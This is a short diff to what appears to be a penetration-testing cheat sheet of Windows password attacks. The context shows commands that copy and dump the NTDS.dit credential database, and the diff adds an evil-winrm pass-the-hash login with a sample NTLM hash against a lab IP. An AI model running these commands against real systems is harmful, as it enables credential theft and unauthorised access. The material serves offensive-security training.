@@ -79,6 +79,9 @@ cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTD
 # Using NetExec to capture NTDS.dit - One-liner
 netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
 
+# Pass the Hash (PtH)
+evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
+
 ```
 
 ### Linux Local Password Attacks
